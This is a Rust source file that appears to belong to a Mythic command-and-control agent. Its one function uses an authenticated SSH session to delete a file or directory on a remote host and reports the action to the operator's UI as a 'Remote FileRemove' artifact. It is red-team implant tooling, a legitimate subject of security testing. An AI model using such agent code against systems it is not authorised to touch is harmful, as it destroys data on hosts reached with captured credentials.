use ssh2::Session;
use std::error::Error;
use std::path::Path;
use std::result::Result;

use crate::agent::AgentTask;
use crate::mythic_success;

use super::SshArgs;

/// Removes a file or directory using SSH
/// * `sess` - Authenticated SSH session
/// * `task` - Mythic task
/// * `args` - Arguments
pub fn ssh_remove(
    sess: Session,
    task: &AgentTask,
    args: &SshArgs,
) -> Result<serde_json::Value, Box<dyn Error>> {
    // Get the path from the arguments
    let path_name = args.rm.as_ref().unwrap();

    let path = Path::new(&path_name);

    // Open an sftp session
    let sftp = sess.sftp()?;

    // Get the path information
    let stat = sftp.stat(path)?;

    // Check if the path is a directory and remove it; otherwise, remove the file
    if stat.is_dir() {
        sftp.rmdir(path)?;
    } else {
        sftp.unlink(path)?;
    }

    // Formulate the output for sending to the Mythic UI
    let mut output = mythic_success!(task.id, format!("Removed: '{}'", path_name));

    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!([
            {
                "base_artifact": "Remote FileRemove",
                "artifact": format!("ssh {}@{} -rm {}", args.credentials.account, args.host, path_name),
            }
        ]),
    );

    Ok(serde_json::to_value(output)?)
}
